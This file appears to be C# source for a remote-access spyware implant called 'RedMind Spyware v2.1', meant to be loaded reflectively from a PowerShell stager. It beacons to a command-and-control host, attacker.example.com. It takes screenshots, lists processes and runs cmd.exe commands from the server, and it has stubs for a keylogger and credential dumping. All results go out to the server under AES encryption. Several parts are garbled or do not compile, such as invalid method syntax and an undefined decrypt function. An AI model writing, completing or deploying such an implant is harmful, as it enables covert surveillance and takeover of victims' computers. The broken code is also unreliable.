// Stage1.cs - Advanced .NET implant with ASCII console UI
// Compile: csc /target:library /out:Stage1.dll Stage1.cs
// Reflective load from PowerShell stager (AES‑encrypted)

// ---------------------------------------------------
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Windows.Forms;

// ---------------------------------------------------
namespace Stage1
{
    public static class Config
    {
        public const string C2_HOST = "attacker.example.com"; // <- replace
        public const int C2_PORT = 8080;
        public static readonly byte[] AES_KEY = Array.Empty<byte>(); // filled at runtime
        public static readonly byte[] AES_IV  = Array.Empty<byte>();
    }

    public static class Implant
    {
        private static readonly HttpClient http = new();
        private static bool _running = true;
        private static int _screenshots = 0;
        private static DateTime _start = DateTime.UtcNow;

        public static void Run()
        {
            try { FetchC2Config(); } catch { Thread.Sleep(3000); Run(); return; }

            while (_running)
            {
                try { PollTask(); } catch { Thread.Sleep(2000); }

                // --- ASCII UI update (every 5 iterations) ---
                if (DateTime.UtcNow.Second % 5 == 0 && Console.IsRedirected == false)
                    UpdateUI();

                Thread.Sleep(1500);
            }
        }

        private static void FetchC2Config()
        {
            var resp = http.GetStringAsync($"http://{Config.C2_HOST}:{Config.C2_PORT}/key").Result;
            var json = JsonSerializer.Deserialize<KeyJson>(resp);
            Config.AES_KEY = Convert.FromBase64String(json.Key);
            Config.AES_IV  = Convert.FromBase64String(json.IV);
        }

        private static void UpdateUI()
        {
            Console.Clear();
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(" ========================================");
            Console.WriteLine(" |          RedMind Spyware v2.1          |");
            Console.WriteLine(" |  C2: " + (http.BaseAddress != null ? "connected" : "disconnected").PadRight(24) + "|");
            Console.WriteLine(" |  Keylogger: " + (GetFlag("keylog") ? "ON" : "OFF").PadRight(20) + "|");
            Console.WriteLine(" |  Screenshots: " + _screenshots.PadRight(20) + "|");
            Console.WriteLine(" |  Uptime: " + ((DateTime.UtcNow - _start).Minutes).ToString().PadRight(8) + "min      |");
            Console.WriteLine(" ========================================");
            Console.ResetColor();
        }

        private static bool GetFlag(string name)
        {
            // Simple in‑process flag store (could be C2‑synced)
            return name == "keylog"; // stub
        }

        private static void PollTask()
        {
            var body = encrypt_data(JsonSerializer.Serialize(new { type = "poll" }));
            var content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");
            var url = $"http://{Config.C2_HOST}:{Config.C2_PORT}/task";
            var rc = http.PostAsync(url, content).Result;
            var raw = rc.Content.ReadAsStringAsync().Result;
            try {
                var enc = decrypt_data(raw);
                var cmdObj = JsonSerializer.Deserialize<TaskJson>(Encoding.UTF8.GetString(enc));
                if (cmdObj?.cmd == "keystart") { StartKeylogger(); }
                else if (cmdObj.cmd == "keystop") { StopKeylogger(); }
                else if (cmdObj.cmd == "screencap") { CaptureScreen(); }
                else if (cmdObj.cmd == "enumprocs") { EnumProcesses(); }
                else if (cmdObj.cmd == "dumpcred") { DumpCreds(); }
                else if (cmdObj.cmd == "shell") { RunShell(cmdObj.args); }
                else SendResult($"unknown:{cmdObj.cmd}");
            } catch { SendResult("corrupt"); }
        }

        // ---- Capability stubs (full impl omitted for brevity) ----
        private static void StartKeylogger()  -> SendResult("keystart:ack");
        private static void StopKeylogger()   -> SendResult("keystop:ack");
        private static void CaptureScreen()
        {
            try
            {
                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using var g = Graphics.FromImage(bmp);
                g.CopyFromScreen(Point.Empty, Point.Empty, bmp.Size);
                using var ms = new MemoryStream();
                bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                _screenshots++;
                SendResult($"screencap:{Convert.ToBase64String(ms.ToArray())}");
            }
            catch { SendResult("screenerr"); }
        }
        private static void EnumProcesses()
        {
            var ids = Process.GetProcesses().Select(p => p.Id);
            SendResult($"procs:{string.Join(",", ids)}");
        }
        private static void DumpCreds() => SendResult("cred:stub");
        private static void RunShell(string args)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", args ?? "")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using var proc = Process.Start(psi);
                proc?.WaitForExit();
                SendResult($"shellout:{proc?.ExitCode ?? -1}");
            }
            catch { SendResult("shelterr"); }
        }

        // --- AES‑encrypted POST helper ---
        private static string encrypt_data(byte[] data)
        {
            using var aes = Aes.Create();
            aes.Key = Config.AES_KEY;
            aes.IV = Config.AES_IV;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            var enc = aes.CreateEncryptor();
            var ct = enc.TransformFinalBlock(data, 0, data.Length);
            return Convert.ToBase64String(ct); // IV prepended by server on receive
        }

        private static void SendResult(string payload)
        {
            var bytes = Encoding.UTF8.GetBytes(payload);
            var b64 = Convert.ToBase64String(encrypt_data(bytes));
            try
            {
                var content = new StringContent($"data={b64}", Encoding.UTF8, "application/x-www-form-urlencoded");
                http.PostAsync($"http://{Config.C2_HOST}:{Config.C2_PORT}/result/{Guid.NewGuid()}", content).Wait();
            }
            catch { /* silent retry loop */ }
        }
    }

    // --- Small JSON helpers deserialized from C2 ----
    public class KeyJson { public string Key; public string IV; }
    public class TaskJson { public string cmd; public string args; }
}